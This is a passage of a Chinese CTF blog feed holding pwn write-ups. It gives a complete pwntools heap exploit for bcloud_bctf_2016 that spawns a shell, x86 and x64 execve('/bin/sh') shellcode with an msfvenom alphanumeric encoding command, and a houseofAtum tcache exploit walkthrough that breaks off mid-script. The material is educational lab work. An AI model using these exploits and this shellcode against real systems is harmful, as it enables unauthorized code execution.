class="string">&#x27;/home/bi0x/pwn_problems/pwning/bcloud_bctf_2016/bcloud_bctf_2016&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/bi0x/ctf/tools/buu-libc/ubuntu16/32/libc-2.23.so&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    sh = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    sh = process(<span class="string">&quot;/home/bi0x/pwn_problems/pwning/bcloud_bctf_2016/bcloud_bctf_2016&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the length of the note content:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   sh.sendafter(<span class="string">&#x27;Input the new content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   sh.sendlineafter(<span class="string">&#x27;Input the id:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">&quot;name:&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>) </span><br><span class="line">chunk_addr = u32(sh.recv(<span class="number">4</span>)) <span class="comment">#泄露chunk_addr</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;chunkaddr:&quot;</span> + <span class="built_in">hex</span>(chunk_addr))</span><br><span class="line">sh.sendafter(<span class="string">&quot;Org:&quot;</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x40</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;Host:&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line"></span><br><span class="line">topchunk_addr = chunk_addr + <span class="number">0xd0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;topchunk = &quot;</span>,<span class="built_in">hex</span>(topchunk_addr)) <span class="comment">#计算top_chunk地址</span></span><br><span class="line"></span><br><span class="line">books_content = <span class="number">0x0804B120</span></span><br><span class="line">offset = books_content - topchunk_addr - <span class="number">20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;offset = &quot;</span>,<span class="built_in">hex</span>(offset)) <span class="comment">#计算偏移地址</span></span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line">add(offset,<span class="string">&#x27;&#x27;</span>) <span class="comment">#malloc大chunk</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_plt = &quot;</span>,<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_got = &quot;</span>,<span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;free_got = &quot;</span>,<span class="built_in">hex</span>(free_got))</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">在books_content中写入篡改目标的地址，chunk编号和内容分别为：</span></span><br><span class="line"><span class="string">0:0x0</span></span><br><span class="line"><span class="string">1:free_got</span></span><br><span class="line"><span class="string">2:puts_got</span></span><br><span class="line"><span class="string">3:&quot;/bin/sh&quot;.addr 就是下面这个字符串的地址</span></span><br><span class="line"><span class="string">4:&quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">add(<span class="number">0x18</span>,p32(<span class="number">0</span>) + p32(free_got) + p32(puts_got) + p32(<span class="number">0x0804B130</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,p32(puts_plt) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment">#将free_got改为puts_plt</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>) <span class="comment">#puts(puts在libc中的真实地址)</span></span><br><span class="line">sh.recv(<span class="number">1</span>)</span><br><span class="line">puts_libc_addr = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_libc_addr = &quot;</span>,<span class="built_in">hex</span>(puts_libc_addr))</span><br><span class="line"></span><br><span class="line">system_addr = puts_libc_addr + libc.symbols[<span class="string">&#x27;system&#x27;</span>] - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system_addr = &quot;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(system_addr) + <span class="string">b&#x27;\n&#x27;</span>) <span class="comment">#free_got改为system真实地址</span></span><br><span class="line">delete(<span class="number">3</span>) <span class="comment">#system(&quot;/bin/sh&quot;.addr)</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"><span class="built_in">print</span>(sh.recv())</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;house-of-force-bcloud-bctf-2016&quot;&gt;&lt;a href=&quot;#house-of-force-bcloud-bctf-2016&quot; class=&quot;headerlink&quot; title=&quot;[house of force]bcloud_bctf_20</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
    <category term="heap" scheme="http://blog.k0nashi.cn/tags/heap/"/>
    
  </entry>
  
  <entry>
    <title>Pwn shellcode学习</title>
    <link href="http://blog.k0nashi.cn/2021/06/14/shellcode/"/>
    <id>http://blog.k0nashi.cn/2021/06/14/shellcode/</id>
    <published>2021-06-14T11:04:06.000Z</published>
    <updated>2023-04-03T06:55:00.253Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Pwn-shellcode学习"><a href="#Pwn-shellcode学习" class="headerlink" title="Pwn shellcode学习"></a>Pwn shellcode学习</h1><h2 id="NASM安装"><a href="#NASM安装" class="headerlink" title="NASM安装"></a>NASM安装</h2><p>在<a href="https://www.nasm.us/">NASM官网</a>下载<a href="https://www.nasm.us/pub/nasm/releasebuilds/2.15.05/nasm-2.15.05.tar.gz">nasm-2.15.05.tar.gz</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar zxvf nasm-2.15.05.tar.gz</span><br><span class="line">cd nasm-2.15.05.tar.gz</span><br><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure><p>安装完成后就可以在linux中编译asm文件了。</p><h2 id="用汇编编写简单的shellcode"><a href="#用汇编编写简单的shellcode" class="headerlink" title="用汇编编写简单的shellcode"></a>用汇编编写简单的shellcode</h2><h3 id="32位shellcode"><a href="#32位shellcode" class="headerlink" title="32位shellcode"></a>32位shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    xor ecx,ecx</span><br><span class="line">    mul ecx</span><br><span class="line">    mov al,11</span><br><span class="line">    push ecx</span><br><span class="line">    push 0x68732f2f ;&quot;//sh&quot;</span><br><span class="line">    push 0x6e69622f;&quot;/bin&quot;</span><br><span class="line">    mov ebx,esp</span><br><span class="line">    int 0x80</span><br></pre></td></tr></table></figure><p>这串汇编指令相当于execve(“/bin/sh”)编写完成后编译。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 shellcode_x86.asm</span><br><span class="line">ld -m elf_i386 shellcode_x86.o -o shellcode_x86</span><br><span class="line">./shellcode_x86</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210614184200557.png" alt="在这里插入图片描述"></p><p>可以看到已经得到权限。</p><p><strong>将文件放入ida，hex view查看代码段</strong><br><img src="https://img-blog.csdnimg.cn/20210614184421475.png" alt="在这里插入图片描述"><br>可以看到绿色这段就是我们要的代码段<br>将它复制，放入C语言程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x31\xC9\xF7\xE1\xB0\x0B\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;</span>;</span><br><span class="line">    (*(<span class="keyword">void</span> (*) () )shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用</p><blockquote><p>gcc -m32 -z execstack shellcode_x86.c -o shellcode_x86_c</p></blockquote><p>运行C编译文件<br><img src="https://img-blog.csdnimg.cn/20210614184735771.png" alt="在这里插入图片描述"><br>可以看到这个C程序也获得了shell。<br>为什么这个C程序也能获得shell呢？因为我们在shellcode这个字符串变量里放入了之前汇编编译的机器码。<br>如果将shellcode这个字符串当做函数指针执行的话，相当于在汇编层面call了shellcode这个函数，执行汇编指令，从而获取shell。</p><h3 id="64位shellcode"><a href="#64位shellcode" class="headerlink" title="64位shellcode"></a>64位shellcode</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"></span><br><span class="line">_start:</span><br><span class="line">    xor rdx,rdx</span><br><span class="line">    mov qword rbx,&#x27;//bin/sh&#x27;</span><br><span class="line">    shr rbx,0x8</span><br><span class="line">    push rbx</span><br><span class="line">    mov rdi,rsp</span><br><span class="line">    push rax</span><br><span class="line">    xor rsi,rsi</span><br><span class="line">    mov al,0x3b</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf64 shellcode64.asm </span><br><span class="line">ld -m elf_x86_64 shellcode64.o -o shellcode64</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\x48\x31\xD2\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x50\x48\x31\xf6\xB0\x3B\x0F\x05&quot;</span>;</span><br><span class="line">    (*(<span class="keyword">void</span> (*) () )shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210614190051342.png" alt="在这里插入图片描述"></p><h2 id="可见字符shellcode"><a href="#可见字符shellcode" class="headerlink" title="可见字符shellcode"></a>可见字符shellcode</h2><h3 id="安装msf"><a href="#安装msf" class="headerlink" title="安装msf"></a>安装msf</h3><p><a href="https://apt.metasploit.com/pool/main/m/metasploit-framework/metasploit-framework_6.0.49+20210611102634~1rapid7-1_amd64.deb">metasploit-framework_6.0.49+20210611102634~1rapid7-1_amd64.deb</a><br>将文件放入linux系统</p><blockquote><p>sudo dpkg -i metasploit-framework_6.0.49+20210611102634~1rapid7-1_amd64.deb</p></blockquote><p>解包后直接输入</p><blockquote><p>msfvenom -l encoders</p></blockquote><p>第一次安装完可能会申请装个database什么的，让它装就行。<br>然后就能看到shellcode编码类型<br><img src="https://img-blog.csdnimg.cn/20210614194800754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05hc2hpX0tv,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我们选择x86/alpha_mixed<br>然后使用这个指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import sys; sys.stdout.write(&quot;\x31\xC9\xF7\xE1\xB0\x0B\x51\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\xCD\x80&quot;)&#x27; | msfvenom -p - -e x86/alpha_mixed -a linux -f raw -a x86 --platform linux BufferRegister=EAX -o payload</span><br></pre></td></tr></table></figure><p>他就会把编译结果放到当前目录的payload文件里</p><blockquote><p>PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJITqHCoyXCMgKsY1XBX0fkbq3XdoFOt3E8axtoCRqyrNiRmY8CnCXCLMzbMPAA</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Pwn-shellcode学习&quot;&gt;&lt;a href=&quot;#Pwn-shellcode学习&quot; class=&quot;headerlink&quot; title=&quot;Pwn shellcode学习&quot;&gt;&lt;/a&gt;Pwn shellcode学习&lt;/h1&gt;&lt;h2 id=&quot;NASM安装&quot;&gt;&lt;a hr</summary>
      
    
    
    
    <category term="notes" scheme="http://blog.k0nashi.cn/categories/notes/"/>
    
    
    <category term="CTF" scheme="http://blog.k0nashi.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="http://blog.k0nashi.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>BCTF2018:hauseofAtum</title>
    <link href="http://blog.k0nashi.cn/2021/03/27/hauseofAtum/"/>
    <id>http://blog.k0nashi.cn/2021/03/27/hauseofAtum/</id>
    <published>2021-03-27T01:37:07.000Z</published>
    <updated>2023-04-03T06:56:34.597Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆利用-TCache机制-hauseofAtum"><a href="#堆利用-TCache机制-hauseofAtum" class="headerlink" title="[堆利用:TCache机制]hauseofAtum"></a>[堆利用:TCache机制]hauseofAtum</h1><p>题目链接：<a href="https://github.com/blue-lotus/BCTF2018/tree/master/pwn/houseofAtum">https://github.com/blue-lotus/BCTF2018/tree/master/pwn/houseofAtum</a></p><h2 id="0x00-逆向分析"><a href="#0x00-逆向分析" class="headerlink" title="0x00 逆向分析"></a>0x00 逆向分析</h2><p>菜单：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">menu</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1. new&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3. delete&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;4. show&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Your choice:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> getint();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>功能：1.创建note</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">alloc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span> &amp;&amp; notes[i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">2</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Too many notes!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input the content:&quot;</span>);</span><br><span class="line">  notes[i] = <span class="built_in">malloc</span>(<span class="number">0x48</span>uLL);</span><br><span class="line">  readn((<span class="keyword">void</span> *)notes[i], <span class="number">0x48</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意点：只能存在两个堆块，存在两个之后再创建会提示太多了。因此要在只有两个堆块的情况下完成。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">readn</span><span class="params">(<span class="keyword">void</span> *a1, <span class="keyword">size_t</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现他对0x48大小的堆块写了0x48大小，可能存在泄露。</p><p>2.修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input the idx:&quot;</span>);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">1</span> || !notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such note!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input the content:&quot;</span>);</span><br><span class="line">  readn(notes[v1], <span class="number">72LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.删除</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">del</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">char</span> v2[<span class="number">2</span>]; <span class="comment">// [rsp+6h] [rbp-Ah] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input the idx:&quot;</span>);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> &amp;&amp; v1 &lt;= <span class="number">1</span> &amp;&amp; notes[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)notes[v1]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Clear?(y/n):&quot;</span>);</span><br><span class="line">    readn(v2, <span class="number">2uLL</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v2[<span class="number">0</span>] == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">      notes[v1] = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such note!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在一个本题关键的漏洞点：<br>只有返回y的时候，才会清除chunk指针，否则不清除。<br>这就导致如果我如果每次free都不clear，那么就可以一直对同一个堆块free。</p><p>4.打印</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input the idx:&quot;</span>);</span><br><span class="line">  v1 = getint();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt; <span class="number">1</span> || !notes[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No such note!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content:&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)notes[v1]);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>关键点：当fastbin的chunk被申请后，如果tcache未满，则会把fastbin中的chunk装入tcache。可以利用这一点，在申请fastbin的同时，将伪造堆块的指针放入tcache的entries中。<br>步骤：<br>1.先创建一个chunk0，再创建一个chunkA，在chunkA的尾部写入0x11后再释放掉（绕过top chunk的合并检测），目的是为后续修改chunk0的size腾出空间。<br>将chunkA多次free，再用show泄露tcache中的chunk地址（chunk_addr）。<br>2.释放七个相同chunk再释放一次，即可让chunk进入fastbin<br>3.将tcache中的chunk（后称chunk0）取出，使得tcache的counts-1变成6的同时，失去entries指针。（之后会详细解释）在取出chunk的同时写入chunk_addr - 0x20<br>4.申请第二个堆块（chunk1），因为此时entries为空，堆块将从fastbin中取出，因为动用了fastbin，而由于之前从tcache中拿了一个chunk ，counts是6（没满），因此，tcache会将fastbin中的chunk放入tcache中。在此操作之前，在fastbin中的chunk0的fd指针已经被改为chunk_addr - 0x20，因此tcache将会把chunk_addr - 0x10写入entries。<br>5.将chunk1释放，因为此时tcache已满，所以它会被放入fastbin（不会放入tcache），再将它取出（优先从tcache取出）。因为之前改写了tcache的entries，此时的chunk1已经变成我们控制chunk0 size的内鬼了。<br>6.通过修改chunk1的内容，使chunk0的size变为0x90再把chunk0 free掉，chunk0就会进unsorted bin。再把chunk1前0x10全改成‘A’，show chunk1，从而泄露libc基地址。<br>7.用chunk1把chunk0恢复原样，由于chunk0 同时存在fastbin和unsortedbin，优先从fastbin取出。再一次把chunk0的fd指针改成free_hook - 0x10，利用和上面一样的方法，把entries改为free_hook，在free_hook上创建堆块，将其地址改为onegadget。<br>8.随便free一个chunk，触发onegadget，完成。</p><h2 id="0x02-详细步骤"><a href="#0x02-详细步骤" class="headerlink" title="0x02 详细步骤"></a>0x02 详细步骤</h2><p>方便阅读脚本，先放一下函数定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span>(<span class="params">cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">&quot;content:&quot;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,cont</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendafter(<span class="string">&quot;content:&quot;</span>,cont)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx,x</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;(y/n)&quot;</span>,x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;idx:&quot;</span>,<span class="built_in">str</span>(idx))</span><br></pre></td></tr></table></figure><h3 id="1-泄露chunk0地址"><a href="#1-泄露chunk0地址" class="headerlink" title="1.泄露chunk0地址"></a>1.泄露chunk0地址</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>():</span></span><br><span class="line">    <span class="keyword">global</span> heap_addr</span><br><span class="line">    new(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    new(p64(<span class="number">0</span>)*<span class="number">7</span> + p64(<span class="number">0x11</span>))</span><br><span class="line">    <span class="comment">#1</span></span><br><span class="line">    